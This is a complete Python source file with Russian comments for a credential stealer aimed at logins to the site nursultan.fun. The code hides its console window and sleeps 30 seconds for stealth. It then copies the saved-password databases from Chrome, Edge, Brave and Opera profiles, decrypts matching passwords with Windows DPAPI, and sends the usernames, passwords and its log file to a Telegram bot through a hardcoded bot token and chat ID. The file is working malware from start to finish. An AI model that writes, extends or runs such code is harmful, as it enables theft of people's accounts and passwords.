import os
import json
import sqlite3
import shutil
import requests
import logging
import win32crypt
import tempfile
import platform
import ctypes
from base64 import b64decode

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "7257475701:AAHZO7eERlnpFzZAeiRYDZpXssAIoCPkJZs"
CHAT_ID = "1602957963"
TARGET_SITE = "nursultan.fun"  # Фокус только на этом сайте
# =====================

# Настройка логирования
log_file = os.path.join(tempfile.gettempdir(), 'nursultan_stealer.log')
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def send_to_telegram(data):
    """Отправка данных в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': f"🚨 Найдены данные для {TARGET_SITE}:\n\n{data}"
        }
        requests.post(url, json=payload)
        return True
    except Exception as e:
        logging.error(f"Telegram error: {str(e)}")
        return False

def get_encryption_key(browser_path):
    """Получение ключа шифрования"""
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Удаляем DPAPI
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        logging.error(f"Key error: {str(e)}")
        return None

def decrypt_password(ciphertext, key):
    """Дешифровка пароля"""
    try:
        return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode('utf-8')
    except:
        return ""

def steal_nursultan_credentials():
    """Основная функция для кражи данных nursultan.fun"""
    results = []
    
    # Список браузеров для проверки
    browsers = {
        'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Opera': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
    }
    
    for name, path in browsers.items():
        try:
            if not os.path.exists(path):
                continue
                
            key = get_encryption_key(path)
            if not key:
                logging.warning(f"Key not found for {name}")
                continue
                
            # Проверяем все профили
            profiles = ['Default'] + [f'Profile {i}' for i in range(1, 6)]
            
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                login_db = os.path.join(profile_path, 'Login Data')
                
                if not os.path.exists(login_db):
                    continue
                    
                logging.info(f"Checking {name} - {profile}")
                
                # Создаем временную копию базы
                temp_db = os.path.join(tempfile.gettempdir(), f"{name}_{profile}_temp_db")
                shutil.copy2(login_db, temp_db)
                
                try:
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    # Ищем только данные для nursultan.fun
                    cursor.execute(f"""
                        SELECT origin_url, username_value, password_value 
                        FROM logins 
                        WHERE origin_url LIKE '%{TARGET_SITE}%'
                    """)
                    
                    for url, username, pwd in cursor.fetchall():
                        password = decrypt_password(pwd, key)
                        if username and password:
                            result = f"🌐 Браузер: {name}\n👤 Логин: {username}\n🔑 Пароль: {password}\n🔗 URL: {url}"
                            results.append(result)
                            logging.info(f"Found credentials: {username}:{password}")
                    
                except sqlite3.OperationalError as e:
                    logging.error(f"Database error: {str(e)}")
                finally:
                    conn.close()
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                        
        except Exception as e:
            logging.error(f"Browser error ({name}): {str(e)}")
    
    return results

def main():
    """Главная функция"""
    try:
        # Скрыть консоль в Windows
        if platform.system() == "Windows":
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        logging.info("===== NURSULTAN STEALER STARTED =====")
        
        # Поиск данных
        credentials = steal_nursultan_credentials()
        
        if credentials:
            # Формируем отчет
            report = "\n\n".join(credentials)
            report += f"\n\n✅ Всего найдено: {len(credentials)} аккаунтов"
            
            # Отправляем в Telegram
            send_to_telegram(report)
            
            # Дополнительно сохраняем в файл
            with open(os.path.join(tempfile.gettempdir(), 'nursultan_credentials.txt'), 'w') as f:
                f.write(report)
        else:
            send_to_telegram(f"❌ Данные для {TARGET_SITE} не найдены")
        
        # Отправляем лог
        if os.path.exists(log_file):
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                with open(log_file, 'rb') as f:
                    requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f})
            except:
                pass
                
        logging.info("===== STEALER FINISHED =====")
        
    except Exception as e:
        logging.exception(f"Critical error: {str(e)}")
        if os.path.exists(log_file):
            try:
                with open(log_file, 'rb') as f:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                        data={'chat_id': CHAT_ID},
                        files={'document': f}
                    )
            except:
                pass

if __name__ == "__main__":
    # Задержка для незаметности
    import time
    time.sleep(30)
    main()